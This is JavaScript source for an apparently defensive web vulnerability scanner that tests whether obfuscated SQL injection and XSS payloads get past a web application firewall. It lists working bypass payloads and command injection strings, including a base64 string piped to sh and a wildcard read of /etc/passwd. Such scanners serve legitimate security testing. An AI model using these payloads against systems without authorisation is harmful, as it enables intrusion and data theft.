/**
 * WAF BYPASS SCANNER
 * Teste des payloads conçus pour contourner les WAF/IDS
 */

const { SecureHttpClient } = require('../utils/secure-http-client');
const { logger } = require('../utils/error-handler');

class WAFBypassScanner {
  constructor() {
    this.httpClient = new SecureHttpClient({ timeout: 10000 });
    this.name = 'WAF Bypass Detection';
    
    // Payloads obfusqués pour bypass WAF
    this.bypassPayloads = {
      sql: [
        // Case variation
        "' Or '1'='1",
        "' oR '1'='1",
        "' OR '1'='1' --",
        
        // URL encoding
        "%27%20OR%20%271%27=%271",
        
        // Double encoding
        "%2527%2520OR%2520%25271%2527=%25271",
        
        // Null bytes
        "' OR '1'='1'%00",
        
        // Comments between keywords
        "' OR/*comment*/'1'='1",
        "' OR/**/'1'='1",
        
        // Unicode
        "%u0027%u0020OR%u0020%u0027%u0031%u0027%u003D%u0027%u0031",
        
        // Whitespace variations
        "'\tOR\t'1'='1",
        "'\nOR\n'1'='1",
        
        // Case + encoding mix
        "%27%20oR%20%271%27%3D%271"
      ],
      
      xss: [
        // Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        
        // HTML entities
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        
        // Mixed encoding
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        
        // Null bytes
        "<script>alert(1)</script>%00",
        
        // Tag obfuscation
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        
        // Event handlers with encoding
        "<img src=x on&#x65;rror=alert(1)>",
        
        // SVG with encoding
        "<svg/on&#x6C;oad=alert(1)>",
        
        // Unicode
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
      ],
      
      command: [
        // Backticks
        "`ping${IFS}-c${IFS}3${IFS}127.0.0.1`",
        
        // Variable expansion
        "$(ping -c 3 127.0.0.1)",
        
        // Hex encoding
        "$(echo cGluZyAtYyAzIDEyNy4wLjAuMQ== | base64 -d | sh)",
        
        // Wildcards
        "/bin/c?t /etc/p?sswd",
        
        // Newline injection
        "ignored%0aping -c 3 127.0.0.1"
      ]
    };
  }

  async scan(url) {
    const findings = [];
    const errors = [];

    try {
      logger.logInfo('Starting WAF Bypass scan', { url });

      let baseline;
      try {
        baseline = await this.httpClient.get(url);
      } catch (e) {
        errors.push('Target unreachable: ' + e.message);
        return { vulnerabilities: findings, errors, url, scanned: new Date().toISOString() };
      }

      const params = this.extractParameters(url, baseline);
      
      for (const param of params) {
        await this.testBypassPayloads(url, param, baseline, findings);
      }

      logger.logInfo('WAF Bypass scan completed', { url, found: findings.length });

    } catch (err) {
      logger.logError(err, { context: 'WAFBypassScanner', url });
      errors.push(err.message);
    }

    return {
      vulnerabilities: findings,
      errors,
      url,
      scanned: new Date().toISOString()
    };
  }

  extractParameters(url, response) {
    const params = [];
    const urlObj = new URL(url);
    
    for (const [key, value] of urlObj.searchParams.entries()) {
      params.push({ name: key, value, type: 'query' });
    }

    return params;
  }

  async testBypassPayloads(baseUrl, param, baseline, findings) {
    // Tester payloads SQL obfusqués
    for (const payload of this.bypassPayloads.sql) {
      try {
        const testUrl = this.buildTestUrl(baseUrl, param, payload);
        const response = await this.httpClient.get(testUrl, { timeout: 6000 });
        
        // Indicateurs de bypass WAF réussi
        const successIndicators = [
          'syntax error', 'mysql', 'postgresql', 'sqlite',
          'ORA-', 'SQL', 'database', 'query failed'
        ];

        if (response.data) {
          for (const indicator of successIndicators) {
            if (response.data.toLowerCase().includes(indicator.toLowerCase())) {
              findings.push({
                severity: 'critical',
                category: 'SQL Injection',
                title: `WAF Bypass - SQL Injection via Obfuscation`,
                description: `Obfuscated SQL injection payload bypassed WAF/filters and triggered database error. Payload: ${payload}`,
                parameter: param.name,
                payload,
                evidence: `Database error indicator found: ${indicator}`,
                cvss_score: 9.5,
                cwe_id: 'CWE-89',
                owasp_category: 'A03:2021 - Injection',
                confidence: 'high',
                remediation_text: 'Implement proper input validation and parameterized queries. WAF alone is insufficient protection.'
              });
              return; // Found bypass, stop
            }
          }
        }

        // Check response differences (possible blind SQLi bypass)
        if (baseline.data && response.data) {
          const sizeDiff = Math.abs(response.data.length - baseline.data.length);
          if (sizeDiff > 200) {
            findings.push({
              severity: 'high',
              category: 'SQL Injection',
              title: `Possible WAF Bypass - SQL Injection (Blind)`,
              description: `Obfuscated payload caused significant response change (${sizeDiff} bytes), suggesting WAF bypass and possible blind SQL injection.`,
              parameter: param.name,
              payload,
              evidence: `Response size changed significantly`,
              cvss_score: 8.0,
              cwe_id: 'CWE-89',
              confidence: 'medium'
            });
          }
        }

      } catch (e) {
        if (e.message && e.message.toLowerCase().includes('sql')) {
          findings.push({
            severity: 'high',
            category: 'SQL Injection',
            title: `WAF Bypass - SQL Error Triggered`,
            description: `Obfuscated payload bypassed WAF and caused SQL error: ${e.message.substring(0, 100)}`,
            parameter: param.name,
            payload,
            evidence: e.message.substring(0, 150),
            cvss_score: 8.5,
            cwe_id: 'CWE-89',
            confidence: 'high'
          });
        }
      }
    }

    // Tester XSS obfusqués
    for (const payload of this.bypassPayloads.xss.slice(0, 5)) { // Limiter pour perf
      try {
        const testUrl = this.buildTestUrl(baseUrl, param, payload);
        const response = await this.httpClient.get(testUrl, { timeout: 5000 });
        
        if (response.data && response.data.includes('script') && response.data.includes('alert')) {
          findings.push({
            severity: 'high',
            category: 'Cross-Site Scripting (XSS)',
            title: `WAF Bypass - XSS via Obfuscation`,
            description: `Obfuscated XSS payload bypassed WAF/filters and was reflected in response.`,
            parameter: param.name,
            payload,
            evidence: 'XSS payload reflected without sanitization',
            cvss_score: 7.8,
            cwe_id: 'CWE-79',
            confidence: 'high',
            remediation_text: 'Implement context-aware output encoding and Content Security Policy.'
          });
          return;
        }
      } catch (e) {}
    }
  }

  buildTestUrl(baseUrl, param, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(param.name, payload);
    return url.toString();
  }
}

module.exports = WAFBypassScanner;
